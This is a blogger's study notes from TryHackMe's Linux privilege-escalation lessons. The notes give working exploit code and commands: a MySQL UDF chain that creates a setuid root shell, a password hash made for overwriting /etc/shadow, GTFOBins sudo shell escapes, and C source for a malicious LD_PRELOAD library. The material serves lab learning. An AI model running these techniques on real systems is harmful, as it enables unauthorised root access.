---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-30 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-30-tryhackme-complete-beginner.html
author: 100007
---

<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2021-10-30</p>
<h1 id="linux-privesc">Linux PrivEsc</h1>
<h2 id="service-exploits">Service Exploits</h2>
<p><a href="https://www.exploit-db.com/exploits/1518">Exploiting MySQL running as root via a malicious user-defined function dynamic library.</a></p>
<p>The key to this is that if MySQL is running as root, then it can write files to all manner of directories. We use this to load a malicious library (raptor_udf2.so from the above ExploitDB link) as a plugin by first dumping it as a blob into a table and then dumping it back out in MySQL’s plugin directory. Once there, we define a UDF using the malicious plugin to allow us to execute system commands; in particular, this lets us set the sticky bit on a copied shell that we can then execute to obtain root.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/user/tools/mysql-udf
gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c <span class="nt">-fPIC</span>
gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
<span class="nb">cat</span> <span class="o">&gt;</span> rootme.sql <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
</span><span class="no">EOF
</span>mysql <span class="nt">-u</span> root mysql &lt; rootme.sql
/tmp/rootbash <span class="nt">-p</span> <span class="c"># Root!</span>
</code></pre></div></div>
<h2 id="weak-file-permissions">Weak File Permissions</h2>
<p>Make a new password hash for /etc/password or /etc/shadow:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd <span class="nt">-m</span> sha-512 <span class="nv">$PASSWORD</span>
</code></pre></div></div>
<p><a href="https://cardboard-iguana.com/notes/local-file-inclusion-attacks.html">It’s also possible to generate MD5 passwords for /etc/passwd using the openssl binary.</a></p>
<h2 id="sudo">Sudo</h2>
<p>Some shell escapes via GTFOBins:</p>
<ul>
<li><code class="language-plaintext highlighter-rouge">awk</code> - <code class="language-plaintext highlighter-rouge">awk 'BEGIN &#x007b;system("/bin/sh")&#x007d;'</code></li>
<li><code class="language-plaintext highlighter-rouge">find</code> - <code class="language-plaintext highlighter-rouge">find . -exec /bin/sh \; -quit</code></li>
<li><code class="language-plaintext highlighter-rouge">ftp</code> - <code class="language-plaintext highlighter-rouge">!/bin/sh</code></li>
<li><code class="language-plaintext highlighter-rouge">iftop</code> - <code class="language-plaintext highlighter-rouge">!/bin/sh</code></li>
<li><code class="language-plaintext highlighter-rouge">less</code> - <code class="language-plaintext highlighter-rouge">!/bin/sh</code></li>
<li><code class="language-plaintext highlighter-rouge">man</code> - <code class="language-plaintext highlighter-rouge">!/bin/sh</code></li>
<li><code class="language-plaintext highlighter-rouge">more</code> - <code class="language-plaintext highlighter-rouge">!/bin/sh</code> (may require TERM to be unset)</li>
<li><code class="language-plaintext highlighter-rouge">nano</code> - ^R^X followed by <code class="language-plaintext highlighter-rouge">reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></li>
<li><code class="language-plaintext highlighter-rouge">nmap</code> - create a file containing <code class="language-plaintext highlighter-rouge">os.execute("/bin/sh")</code> and then run <code class="language-plaintext highlighter-rouge">nmap --script=$FILE</code></li>
<li><code class="language-plaintext highlighter-rouge">vim</code> - <code class="language-plaintext highlighter-rouge">:set shell=/bin/sh</code> followed by <code class="language-plaintext highlighter-rouge">:shell</code></li>
</ul>
<p>If LD_PRELOAD or LD_LIBRARY_PATH are preserved by sudo, then it’s also possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
<p>LD_PRELOAD is probably the easiest of these to exploit, because a library listed in this environment variable is just automatically loaded on application start. So just run <code class="language-plaintext highlighter-rouge">sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd</code>.</p>
<p>A simple malicious library (perhaps <em>the</em> simplest) that can exploit the LD_PRELOAD trick is:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">&#x007b;</span>
<span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
<span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash -p"</span><span class="p">);</span>
<span class="p">&#x007d;</span>
</code></pre></div></div>
<p>Compile with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-nostartfiles</span> <span class="se">\</span>
<span class="nt">-o</span> /path/to/malicious.so /path/to/malicious.c
</code></pre></div></div>
<p>Using LD_LIBRARY_PATH is a bit trickier; use ldd to see what libraries a program is already pulling in, and then name your malicious library after one of these. Then run <code class="language-plaintext highlighter-rouge">sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd</code> to trick the program into loading your malicious library instead of the legitimate system library.</p>
<p>While the same code as LD_PRELOAD can be used as a starting point for an LD_LIBRARY_PATH exploit, things get trickier because some libraries are required by others, loaded at different times, or have functions (symbols) that are loaded but not used right away. So some amount of trial-and-error, both in the naming of the malicious library and in what functions are defined within it, may be required.</p>
<p>NOTE that not every UNIX-like system calls their library path LD_LIBRARY_PATH!</p>
<ul>
<li><a href="https://gtfobins.github.io">GTFOBins</a></li>
</ul>